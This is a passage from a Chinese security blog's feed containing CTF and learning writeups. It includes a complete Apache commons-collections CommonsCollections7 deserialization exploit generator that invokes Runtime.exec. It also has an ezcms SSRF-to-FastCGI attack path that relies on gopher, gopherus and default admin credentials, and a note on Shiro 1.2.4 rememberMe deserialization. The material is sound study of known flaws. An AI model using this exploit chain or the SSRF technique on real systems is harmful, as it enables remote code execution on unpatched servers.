class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))  <span class="comment">// &lt;-- 这里进入 AbstractMap.equals</span></span><br><span class="line">            e = p;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后 exp 如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"placeholder"</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap1 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap1.put(<span class="string">"yy"</span>, <span class="string">"1"</span>); <span class="comment">// "yy".hashCode() == "zZ".hashCode() == 3872</span></span><br><span class="line">        HashMap innerMap2 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap2.put(<span class="string">"zZ"</span>, <span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(lazyMap1, <span class="string">"placeholder"</span>);</span><br><span class="line">        hashMap.put(lazyMap2, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        innerMap1.remove(<span class="string">"zZ"</span>); <span class="comment">// 在 put 的时候产生碰撞, 根据上面的分析调用 LazyMap.get, LazyMap 会将结果存入 innerMap 中缓存, 所以这里需要将其清除, 否则 hashcode 就不一样了 </span></span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); <span class="comment">// 同上, 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到这些 chain 最后均需要经过 InvokerTransformer 或者 InstantiateTransformer. commons-collections 的修复也是着力于重点, 直接 ban 掉这两个类的 readObject, 一劳永逸.<br>而这些中对于 commons-collections4, 比较实用的是 CommonsCollections2, CommonsCollections4. 对于 commons-collections3, 为 CommonsCollections6, CommonsCollections7. 利用能否成功只与 commons-collections 自身的版本有关, 而与 jre 的版本没有太大关系, 只要不要是远古版本即可. 而且实际上不少 chain 是两者都通用的, 只不过 ysoserial 没有编写, 只需要稍稍修改就行.  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>2019 高校运维 ezcms 复现</title>
    <link href="https://rmb122.com/2020/01/13/2019-%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4-ezcms-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://rmb122.com/2020/01/13/2019-%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4-ezcms-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-01-12T16:04:55.000Z</published>
    <updated>2020-01-12T16:06:35.271Z</updated>
    
    <content type="html"><![CDATA[<p>之前高校运维碰到的题目, 当时就我一个人输出 web + 自己太菜了, 就没做出来 _(:3」∠)_, 寒假有时间看看, 复现一下题目.</p><a id="more"></a><p>题目非常良心的给了 docker-compose.yml, 所以搭建环境很简单. 把 install.lock 删掉重新装一遍就 ok.<br>经过一段时间审计, 可以发现 <code>application/collection/controller/collection_content.class.php</code> 中 <code>collection_test</code> 等函数, 实际上未经任何过滤就将 URL 传给了 <code>collection::get_content</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 添加采集节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$_POST[<span class="string">'urlpage'</span>]) showmsg(<span class="string">'网址配置不能为空！'</span>);</span><br><span class="line">        $res = D(<span class="string">'collection_node'</span>)-&gt;insert($_POST);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), U(<span class="string">'init'</span>), <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            showmsg(L(<span class="string">'operation_failure'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;admin_tpl(<span class="string">'collection_node_add'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">collection_test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!$id) showmsg(L(<span class="string">'lose_parameters'</span>));</span><br><span class="line">    $data = D(<span class="string">'collection_node'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'nodeid'</span> =&gt; $id))-&gt;find();</span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'urlpage'</span>] == <span class="string">''</span>) showmsg(<span class="string">'网址配置不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//目标网址</span></span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'sourcetype'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">        $url = str_replace(<span class="string">'(*)'</span>, $data[<span class="string">'pagesize_start'</span>], $data[<span class="string">'urlpage'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $url = $data[<span class="string">'urlpage'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义采集列表区间</span></span><br><span class="line">    $url_start = $data[<span class="string">'url_start'</span>];</span><br><span class="line">    $url_end = $data[<span class="string">'url_end'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($url_start == <span class="string">''</span> || $url_end == <span class="string">''</span>) showmsg(<span class="string">'列表区域配置不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line"></span><br><span class="line">    $content = collection::get_content($url);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_content</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">self</span>::$url = $url;</span><br><span class="line"></span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span> (extension_loaded(<span class="string">'curl'</span>)) &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        $content = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $content = @file_get_contents($url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> trim($content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的 SSRF, 再结合 nginx 配置.</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> snippets/fastcgi-php.conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># With php-fpm (or other unix sockets):</span></span><br><span class="line"><span class="comment">#fastcgi_pass unix:/run/php/php7.3-fpm.sock;</span></span><br><span class="line">    <span class="comment"># With php-cgi (or other tcp sockets):</span></span><br><span class="line">    <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显就是 gopher 打 fastcgi 了.</p><p>根据 view 里的文字, 可以猜出是采集功能. 用默认账号密码 yzmcms 登录进后台之后在模块管理里面就能找到, 拿 gopherus 一把梭就可以.</p><p>然后我去看了眼最新代码 <code>https://github.com/yzmcms/yzmcms</code>. 仍然没有修复, 怪不得 wp 还没出来 (逃</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前高校运维碰到的题目, 当时就我一个人输出 web + 自己太菜了, 就没做出来 _(:3」∠)_, 寒假有时间看看, 复现一下题目.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="writeup" scheme="https://rmb122.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>OGeek 线下 Java Web And XCTF Final babytaint Writeup</title>
    <link href="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/"/>
    <id>https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/</id>
    <published>2019-10-31T14:37:15.000Z</published>
    <updated>2019-10-31T15:08:11.950Z</updated>
    
    <content type="html"><![CDATA[<p>因为最近课程非常非常多, 还顺带考试 + 实验报告, 咕咕咕掉了许多比赛, 真正去的也只有 OGeek, 其他都是云比赛.<br>拿做出来的题目里面选两题写个 Writeup 吧, 不然太久没更新了 (逃</p><a id="more"></a><h2 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h2><p>这题运气比较好, 拿了一血<br>拿到题目可以看到一堆 jsp, 可以确定是 java web.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 2 . --dirsfirst</span><br><span class="line">.</span><br><span class="line">├── css</span><br><span class="line">│   ├── main.css</span><br><span class="line">│   └── util.css</span><br><span class="line">├── fonts</span><br><span class="line">│   ├── font-awesome-4.7.0</span><br><span class="line">│   ├── iconic</span><br><span class="line">│   └── poppins</span><br><span class="line">├── images</span><br><span class="line">│   ├── icons</span><br><span class="line">│   └── bg-01.jpg</span><br><span class="line">├── js</span><br><span class="line">│   └── main.js</span><br><span class="line">├── META-INF</span><br><span class="line">│   └── MANIFEST.MF</span><br><span class="line">├── vendor</span><br><span class="line">│   ├── animate</span><br><span class="line">│   ├── animsition</span><br><span class="line">│   ├── bootstrap</span><br><span class="line">│   ├── countdowntime</span><br><span class="line">│   ├── css-hamburgers</span><br><span class="line">│   ├── daterangepicker</span><br><span class="line">│   ├── jquery</span><br><span class="line">│   ├── perfect-scrollbar</span><br><span class="line">│   └── select2</span><br><span class="line">├── WEB-INF</span><br><span class="line">│   ├── classes</span><br><span class="line">│   ├── lib</span><br><span class="line">│   └── web.xml</span><br><span class="line">├── error.jsp</span><br><span class="line">├── index.jsp</span><br><span class="line">├── login.jsp</span><br><span class="line">└── success.jsp</span><br></pre></td></tr></table></figure><p>逻辑比较简单, 漏洞也不在这些 jsp 里面</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">"shiro"</span> uri=<span class="string">"http://shiro.apache.org/tags"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Login V3&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"icon"</span> type=<span class="string">"image/png"</span> href=<span class="string">"images/icons/favicon.ico"</span>/&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"vendor/bootstrap/css/bootstrap.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/font-awesome-4.7.0/css/font-awesome.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"fonts/iconic/css/material-design-iconic-font.min.css"</span>&gt;</span><br><span class="line">    &lt;!--===============================================================================================--&gt;</span><br><span class="line">&lt;!-- 省略掉一些 html --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&lt;form action=<span class="string">"/register"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span> value=<span class="string">""</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到 shiro, 注意 <code>WEB-INF/lib/</code> 里面的 <code>shiro-core-1.2.4.jar</code> 是存在漏洞的版本, 可以利用 java 反序列化执行命令.<br>遂直接用了之前的找的 exp, 但是 JRMPClient 并没有回连的反应, 再看看 web.xml</p><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">    classpath:spring-shiro.xml</span><br><span class="line">  <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.DelegatingFilterProxy<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>targetFilterLifecycle<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>shiroFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>找到 WEB-INF/classes/spring-shiro.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 省略掉一些没用的配置 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- rememberMe管理器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"rememberMeManager"</span> <span class="attr">class</span>=<span class="string">"com.collection.shiro.manager.ShiroRememberManager"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"cookie"</span> <span class="attr">ref</span>=<span class="string">"rememberMeCookie"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 省略掉一些没用的配置 --&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到出题人用了自己实现的 rememberMeManager, 我们掏出 jd-gui 看看.</p><p>WEB-INF/classes/com/collection/shiro/manager/ShiroRememberManager.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 